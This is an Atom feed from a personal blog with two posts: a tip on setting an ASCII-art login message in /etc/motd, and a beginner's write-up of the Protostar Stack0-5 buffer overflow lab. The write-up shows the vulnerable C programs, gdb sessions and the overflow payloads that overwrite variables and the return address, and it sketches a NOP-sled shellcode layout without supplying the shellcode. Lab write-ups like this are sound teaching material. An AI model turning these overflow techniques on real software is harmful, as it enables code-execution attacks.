<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[punMag]]></title>
  <link href="http://tungpun.github.io/atom.xml" rel="self"/>
  <link href="http://tungpun.github.io/"/>
  <updated>2015-08-13T21:40:35+00:00</updated>
  <id>http://tungpun.github.io/</id>
  <author>
    <name><![CDATA[Tung Pun]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Have Fun With Linux - Configure Welcome Message]]></title>
    <link href="http://tungpun.github.io/blog/2015/08/11/have-fun-with-linux-configure-welcome-message/"/>
    <updated>2015-08-11T18:53:19+00:00</updated>
    <id>http://tungpun.github.io/blog/2015/08/11/have-fun-with-linux-configure-welcome-message</id>
    <content type="html"><![CDATA[<p>Have you ever felt boring with your linux server&rsquo;s default message ?
Do you wanna something like:</p>

<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>
</span><span class='line'>                              *********                                       
</span><span class='line'>                         *******      **                                      
</span><span class='line'>                    *****              **                                     
</span><span class='line'>               ******       ****        **                                    
</span><span class='line'>             ****    *                 ***                                    
</span><span class='line'>           ****              ***   ***     **                                 
</span><span class='line'>        * ***** ******                      **            ***                 
</span><span class='line'>       ***            **********      ****   ***         ****                 
</span><span class='line'>       **                     ****             **       **  *         ********
</span><span class='line'>         ***                      ***      **  **      **** ***            ***
</span><span class='line'>         *                           *****    ****   ***    ********          
</span><span class='line'>         *****                          ***     ***  ***   *** **             
</span><span class='line'>           **   ******** ***********    ** ***   **  **       **   ****       
</span><span class='line'>            ****                       **    ***  *  *** *****   *********    
</span><span class='line'>             **                        **     *****   ***       **************
</span><span class='line'>            **                        ***    **** *     ****   ***************
</span><span class='line'>            **                        *        *      *****         **********
</span><span class='line'>             **                      **     *** *****   **********************
</span><span class='line'>              **                    **      **   ***********                 *
</span><span class='line'>                *****              ***  ****               **            *   *
</span><span class='line'>                     **************   *                     **          ******
</span><span class='line'>                         **   *******                        ***** ******* ***
</span><span class='line'>                        **  **************                       *************
</span><span class='line'>                       ***  * ****** **  **                      *************
</span><span class='line'>                       **   *******   *****                     **************
</span><span class='line'>                       **   ** ** ********                     ******* * *****
</span><span class='line'>                      ******************                       *  ****  ******
</span><span class='line'>     #TungPun          *****   *******                         ********** ****
</span><span class='line'>                      **       **   **                         ** ************
</span><span class='line'> *  *  *  *  ** ** *****************************  **** ***********************
</span><span class='line'>                   *       ***   **      *************************************
</span><span class='line'>      **                                 *        **  **** ********** ********
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>:::::::::  :::    ::: ::::    :::     :::     :::::::::   ::::::::  :::    :::
</span><span class='line'>:+:    :+: :+:    :+: :+:+:   :+:   :+: :+:   :+:    :+: :+:    :+: :+:    :+:
</span><span class='line'>+:+    +:+ +:+    +:+ :+:+:+  +:+  +:+   +:+  +:+    +:+ +:+        +:+    +:+
</span><span class='line'>+#++:++#+  +#+    +:+ +#+ +:+ +#+ +#++:++#++: +#++:++#:  +#+        +#++:++#++
</span><span class='line'>+#+        +#+    +#+ +#+  +#+#+# +#+     +#+ +#+    +#+ +#+        +#+    +#+
</span><span class='line'>#+#        #+#    #+# #+#   #+#+# #+#     #+# #+#    #+# #+#    #+# #+#    #+#
</span><span class='line'>###         ########  ###    #### ###     ### ###    ###  ########  ###    ###
</span></code></pre></td></tr></table></div></figure></notextile></div>


<p>Prepare a ascii art which you like then echo it to <code>/etc/motd</code> (message of the day).
All done~ Restart your session and enjoy :D</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Hello Pwnable, Protostar Stack0~5]]></title>
    <link href="http://tungpun.github.io/blog/2015/08/11/hello-pwnable/"/>
    <updated>2015-08-11T11:53:34+00:00</updated>
    <id>http://tungpun.github.io/blog/2015/08/11/hello-pwnable</id>
    <content type="html"><![CDATA[<p>On my summer holiday, I have spent a couple of day to learn pwnable at  <a href="https://exploit-exercises.com/protostar/">protostar</a> where has interesting challenges. With newbie, i believe that if you try to follow from Stack 0 to Stack 5 (i wanna more, but now i haven&rsquo;t finished all of them), you will got steady base about Stack and have plan to dig deeper for the Buffer over Flow technique in the future.</p>

<p>After reading my previous articles, you know my English is too terrible. I will try with my best, and blogging is one of my efforts to improve my English.</p>

<p>Here we go,</p>

<h2>STACK 0</h2>

<p>This is the first (easiest, too) level. They&rsquo;ve given us a piece of code:</p>

<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>/* stack0.c */
</span><span class='line'>#include &lt;stdlib.h&gt;
</span><span class='line'>#include &lt;unistd.h&gt;
</span><span class='line'>#include &lt;stdio.h&gt;
</span><span class='line'>
</span><span class='line'>int main(int argc, char **argv)
</span><span class='line'>{
</span><span class='line'>  volatile int modified;
</span><span class='line'>  char buffer[64];
</span><span class='line'>
</span><span class='line'>  modified = 0;
</span><span class='line'>  gets(buffer);
</span><span class='line'>
</span><span class='line'>  if(modified != 0) {
</span><span class='line'>      printf("you have changed the 'modified' variable\n");
</span><span class='line'>  } else {
</span><span class='line'>      printf("Try again?\n");
</span><span class='line'>  }
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure></notextile></div>


<p>Our goal is modify <strong>modified</strong>&rsquo;s value through <strong>gets(buffer)</strong> function. &ldquo;Sound fabulous, how can i change this variable&rsquo;s value when i cant touch it ?&rdquo;. However, when you use <a href="http://www.gnu.org/software/gdb/">gdb</a> to debug that file, you will recognize that <strong>buffer</strong>&rsquo;s address is just below <strong>modified</strong>&rsquo;s address in STACK. So, if we overload the <strong>buffer</strong>, the leftover will overwrite <strong>modified</strong> => the payload we need in this level is a string contains 70 * <strong>A</strong> (try more if you want).</p>

<h2>STACK 1</h2>

<p>In this challenge, we have a code which is much the same as previous one.</p>

<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>/* stack1.c */
</span><span class='line'>#include &lt;stdlib.h&gt;
</span><span class='line'>#include &lt;unistd.h&gt;
</span><span class='line'>#include &lt;stdio.h&gt;
</span><span class='line'>#include &lt;string.h&gt;
</span><span class='line'>
</span><span class='line'>int main(int argc, char **argv)
</span><span class='line'>{
</span><span class='line'>  volatile int modified;
</span><span class='line'>  char buffer[64];
</span><span class='line'>
</span><span class='line'>  if(argc == 1) {
</span><span class='line'>      errx(1, "please specify an argument\n");
</span><span class='line'>  }
</span><span class='line'>
</span><span class='line'>  modified = 0;
</span><span class='line'>  strcpy(buffer, argv[1]);
</span><span class='line'>
</span><span class='line'>  if(modified == 0x61626364) {
</span><span class='line'>      printf("you have correctly got the variable to the right value\n");
</span><span class='line'>  } else {
</span><span class='line'>      printf("Try again, you got 0x%08x\n", modified);
</span><span class='line'>  }
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure></notextile></div>


<p>Not only overload <strong>buffer</strong>, we need make <strong>modified</strong>&rsquo;s value same as <strong>0x61626364</strong> (equal to <strong>dcba</strong> in ascii).
Cuz the execute environment belongs to Little Endiance system, so you must <strong>pack(&lsquo;&lt;I&rsquo;, targetvalue)</strong></p>

<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>payload = 64 * 'A' + pack('&lt;I", '0x61626364')
</span><span class='line'>        = 64 * 'A' + '\x64\x63\x62\x61'</span></code></pre></td></tr></table></div></figure></notextile></div>


<h2>STACK 2</h2>

<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>/* stack2.c */
</span><span class='line'>#include &lt;stdlib.h&gt;
</span><span class='line'>#include &lt;unistd.h&gt;
</span><span class='line'>#include &lt;stdio.h&gt;
</span><span class='line'>#include &lt;string.h&gt;
</span><span class='line'>
</span><span class='line'>int main(int argc, char **argv)
</span><span class='line'>{
</span><span class='line'>  volatile int modified;
</span><span class='line'>  char buffer[64];
</span><span class='line'>  char *variable;
</span><span class='line'>
</span><span class='line'>  variable = getenv("GREENIE");
</span><span class='line'>
</span><span class='line'>  if(variable == NULL) {
</span><span class='line'>      errx(1, "please set the GREENIE environment variable\n");
</span><span class='line'>  }
</span><span class='line'>
</span><span class='line'>  modified = 0;
</span><span class='line'>
</span><span class='line'>  strcpy(buffer, variable);
</span><span class='line'>
</span><span class='line'>  if(modified == 0x0d0a0d0a) {
</span><span class='line'>      printf("you have correctly modified the variable\n");
</span><span class='line'>  } else {
</span><span class='line'>      printf("Try again, you got 0x%08x\n", modified);
</span><span class='line'>  }
</span><span class='line'>
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure></notextile></div>


<p>Instead of reading buffer from keyboard, this level require <code>GREENIE</code> environment variable. We use <code>export</code> command in Linux</p>

<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>➜  GREENIE=`python2 -c 'print "A" * 64 + "\x0a\x0d\x0a\x0d"'`
</span><span class='line'>➜  export GREENIE
</span><span class='line'>➜  ./stack2
</span><span class='line'>you have correctly modified the variable</span></code></pre></td></tr></table></div></figure></notextile></div>


<h2>STACK 3</h2>

<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>/* stack3.c */
</span><span class='line'>#include &lt;stdlib.h&gt;
</span><span class='line'>#include &lt;unistd.h&gt;
</span><span class='line'>#include &lt;stdio.h&gt;
</span><span class='line'>#include &lt;string.h&gt;
</span><span class='line'>
</span><span class='line'>void win()
</span><span class='line'>{
</span><span class='line'>  printf("code flow successfully changed\n");
</span><span class='line'>}
</span><span class='line'>
</span><span class='line'>int main(int argc, char **argv)
</span><span class='line'>{
</span><span class='line'>  volatile int (*fp)();
</span><span class='line'>  char buffer[64];
</span><span class='line'>
</span><span class='line'>  fp = 0;
</span><span class='line'>
</span><span class='line'>  gets(buffer);
</span><span class='line'>
</span><span class='line'>  if(fp) {
</span><span class='line'>      printf("calling function pointer, jumping to 0x%08x\n", fp);
</span><span class='line'>      fp();
</span><span class='line'>  }
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure></notextile></div>


<p>In the end of this piece of code, the program call the function which has address stored in <code>fp</code> &rsquo;s value. So, how to force the program to call <code>win</code> function ? The first thought is overwrite <code>win</code> &rsquo;s address to <code>fp</code> value.</p>

<p>But, what is <code>win</code>&rsquo;s address ?</p>

<p>Using gdb (with <a href="https://github.com/longld/peda">peda</a>) we have:</p>

<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>➜  gdb -q stack3
</span><span class='line'>Reading symbols from stack3...done.
</span><span class='line'>gdb-peda$ disass win
</span><span class='line'>Dump of assembler code for function win:
</span><span class='line'>   0x08048424 &lt;+0&gt;:     push   ebp
</span><span class='line'>   0x08048425 &lt;+1&gt;:     mov    ebp,esp
</span><span class='line'>   0x08048427 &lt;+3&gt;:     sub    esp,0x18
</span><span class='line'>   0x0804842a &lt;+6&gt;:     mov    DWORD PTR [esp],0x8048540
</span><span class='line'>   0x08048431 &lt;+13&gt;:    call   0x8048360 &lt;puts@plt&gt;
</span><span class='line'>   0x08048436 &lt;+18&gt;:    leave
</span><span class='line'>   0x08048437 &lt;+19&gt;:    ret
</span><span class='line'>End of assembler dump.
</span><span class='line'>gdb-peda$</span></code></pre></td></tr></table></div></figure></notextile></div>


<p>So <code>win</code> &rsquo;s address is <code>0x08048424</code>. Now, we will build a payload, which contains 64 &lsquo;A&rsquo; characters and <code>0x08048424</code> in Little Endiance.</p>

<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>➜  python2 -c 'print "A" * 64 + "\x24\x84\x04\x08"' &gt; input3.b
</span><span class='line'>➜  ./stack3 &lt; input3.b
</span><span class='line'>calling function pointer, jumping to 0x08048424
</span><span class='line'>code flow successfully changed</span></code></pre></td></tr></table></div></figure></notextile></div>


<h2>STACK 4</h2>

<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>/* stack4.c */
</span><span class='line'>#include &lt;stdlib.h&gt;
</span><span class='line'>#include &lt;unistd.h&gt;
</span><span class='line'>#include &lt;stdio.h&gt;
</span><span class='line'>#include &lt;string.h&gt;
</span><span class='line'>
</span><span class='line'>void win()
</span><span class='line'>{
</span><span class='line'>  printf("code flow successfully changed\n");
</span><span class='line'>}
</span><span class='line'>
</span><span class='line'>int main(int argc, char **argv)
</span><span class='line'>{
</span><span class='line'>  char buffer[64];
</span><span class='line'>
</span><span class='line'>  gets(buffer);
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure></notextile></div>


<p>This piece of code is so brief. Same idea as Stack 3, we must change code flow to <code>win</code> function, however there is no <code>fb</code> for us overwrite.</p>

<blockquote><p>It&rsquo;s time for EIP.</p></blockquote>

<p>When disassembly main function, we have:</p>

<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>➜  gdb -q stack4
</span><span class='line'>Reading symbols from stack4...done.
</span><span class='line'>gdb-peda$ disass main
</span><span class='line'>Dump of assembler code for function main:
</span><span class='line'>   0x08048408 &lt;+0&gt;:     push   ebp
</span><span class='line'>   0x08048409 &lt;+1&gt;:     mov    ebp,esp
</span><span class='line'>   0x0804840b &lt;+3&gt;:     and    esp,0xfffffff0
</span><span class='line'>   0x0804840e &lt;+6&gt;:     sub    esp,0x50
</span><span class='line'>   0x08048411 &lt;+9&gt;:     lea    eax,[esp+0x10]
</span><span class='line'>   0x08048415 &lt;+13&gt;:    mov    DWORD PTR [esp],eax
</span><span class='line'>   0x08048418 &lt;+16&gt;:    call   0x804830c &lt;gets@plt&gt;
</span><span class='line'>   0x0804841d &lt;+21&gt;:    leave
</span><span class='line'>   0x0804841e &lt;+22&gt;:    ret
</span><span class='line'>End of assembler dump.
</span><span class='line'>gdb-peda$</span></code></pre></td></tr></table></div></figure></notextile></div>


<p>After <code>leave</code> instructor in <code>*main+21</code>, the program will call the function which has address equal to <code>EIP register</code>&rsquo;s value. The easiest way to pass this level is overwrite EIP.</p>

<p>First of all, we need <code>EIP</code> &rsquo;s offset. Try inject <code>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1234567</code></p>

<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>➜  gdb stack4
</span><span class='line'>Reading symbols from stack4...done.
</span><span class='line'>gdb-peda$ r
</span><span class='line'>Starting program: /root/protostar/bin/stack4
</span><span class='line'>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1234567
</span><span class='line'>
</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
</span><span class='line'>[----------------------------------registers-----------------------------------]
</span><span class='line'>EAX: 0xffffda90 ('A' &lt;repeats 74 times&gt;, "1234567")
</span><span class='line'>EBX: 0x0
</span><span class='line'>ECX: 0xf7fca5a0 --&gt; 0xfbad2288
</span><span class='line'>EDX: 0xf7fcb87c --&gt; 0x0
</span><span class='line'>ESI: 0x1
</span><span class='line'>EDI: 0xf7fca000 --&gt; 0x1b5db0
</span><span class='line'>EBP: 0x32314141 ('AA12')
</span><span class='line'>ESP: 0xffffdae0 --&gt; 0x37 ('7')
</span><span class='line'>EIP: 0x36353433 ('3456')
</span><span class='line'>EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
</span><span class='line'>[-------------------------------------code-------------------------------------]
</span><span class='line'>Invalid $PC address: 0x36353433
</span><span class='line'>[------------------------------------stack-------------------------------------]
</span><span class='line'>0000| 0xffffdae0 --&gt; 0x37 ('7')
</span><span class='line'>0004| 0xffffdae4 --&gt; 0xffffdb74 --&gt; 0xffffdca3 ("/root/protostar/bin/stack4")
</span><span class='line'>0008| 0xffffdae8 --&gt; 0xffffdb7c --&gt; 0xffffdcbe ("USER=root")
</span><span class='line'>0012| 0xffffdaec --&gt; 0x0
</span><span class='line'>0016| 0xffffdaf0 --&gt; 0x0
</span><span class='line'>0020| 0xffffdaf4 --&gt; 0x0
</span><span class='line'>0024| 0xffffdaf8 --&gt; 0xf7fca000 --&gt; 0x1b5db0
</span><span class='line'>0028| 0xffffdafc --&gt; 0x8048218 --&gt; 0x675f5f00 ('')
</span><span class='line'>[------------------------------------------------------------------------------]
</span><span class='line'>Legend: code, data, rodata, value
</span><span class='line'>Stopped reason: SIGSEGV
</span><span class='line'>0x36353433 in ?? ()</span></code></pre></td></tr></table></div></figure></notextile></div>


<p>We have &lsquo;0x36353433&rsquo; (equal to <code>3456</code> in ascii).</p>

<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>payload = prefix + target_address
</span><span class='line'>prefix = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA12"</span></code></pre></td></tr></table></div></figure></notextile></div>


<p>Next, we will find address of <code>win</code> function through the previous way.</p>

<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>gdb-peda$ disass win
</span><span class='line'>Dump of assembler code for function win:
</span><span class='line'>   0x080483f4 &lt;+0&gt;:     push   ebp
</span><span class='line'>   0x080483f5 &lt;+1&gt;:     mov    ebp,esp
</span><span class='line'>   0x080483f7 &lt;+3&gt;:     sub    esp,0x18
</span><span class='line'>   0x080483fa &lt;+6&gt;:     mov    DWORD PTR [esp],0x80484e0
</span><span class='line'>   0x08048401 &lt;+13&gt;:    call   0x804832c &lt;puts@plt&gt;
</span><span class='line'>   0x08048406 &lt;+18&gt;:    leave
</span><span class='line'>   0x08048407 &lt;+19&gt;:    ret
</span><span class='line'>End of assembler dump.</span></code></pre></td></tr></table></div></figure></notextile></div>


<p>=> 0x080483f4</p>

<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>payload = prefix + target_address
</span><span class='line'>prefix = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA12"
</span><span class='line'>target_address = "\xf4\x83\x04\x08"
</span><span class='line'>payload = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA12" + "\xf4\x83\x04\x08"</span></code></pre></td></tr></table></div></figure></notextile></div>


<p>Compose input file and inject to program</p>

<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>➜  python2 -c 'print "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA12" + "\xf4\x83\x04\x08"' &gt; input4.b
</span><span class='line'>➜  ./stack4 &lt; input4.b
</span><span class='line'>code flow successfully changed
</span><span class='line'>[1]    50114 segmentation fault (core dumped)  ./stack4 &lt; input4.b</span></code></pre></td></tr></table></div></figure></notextile></div>


<h2>STACK 5</h2>

<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>/* stack5.c */
</span><span class='line'>#include &lt;stdlib.h&gt;
</span><span class='line'>#include &lt;unistd.h&gt;
</span><span class='line'>#include &lt;stdio.h&gt;
</span><span class='line'>#include &lt;string.h&gt;
</span><span class='line'>
</span><span class='line'>int main(int argc, char **argv)
</span><span class='line'>{
</span><span class='line'>  char buffer[64];
</span><span class='line'>
</span><span class='line'>  gets(buffer);
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure></notextile></div>


<p>There is not <strong>win()</strong> function, just two line for initialization and read input. &ldquo;Have you ever forgetten copying some thing ?&rdquo;</p>

<p>Don&rsquo;t worry, it is the great chance for us to make friend with shellcode.
We should overwrite EIP (using technique from previous challenge) in order to redirect program execution to our shellcode, which also was injected to input data.</p>

<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>payload = flushdata + bufaddr + nopdata + shellcode</span></code></pre></td></tr></table></div></figure></notextile></div>


<p>Easily to recognize that</p>

<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>flushdata = 'A' * 76</span></code></pre></td></tr></table></div></figure></notextile></div>


<p><strong>bufaddr</strong> points to shellcode&rsquo;s address in Stack. Using <strong>gdb</strong>, we have:</p>

<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>bufaddr = pack("&lt;I", 0xffffdbe0)</span></code></pre></td></tr></table></div></figure></notextile></div>


<p><strong>nopdata</strong> was used to avoid the different between the memory address inside gdb and outside.</p>

<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nopdata = "\x90" * 66</span></code></pre></td></tr></table></div></figure></notextile></div>


<blockquote><p>What is <strong>shellcode</strong> ? Where should we find <strong>shellcode</strong> ?</p></blockquote>

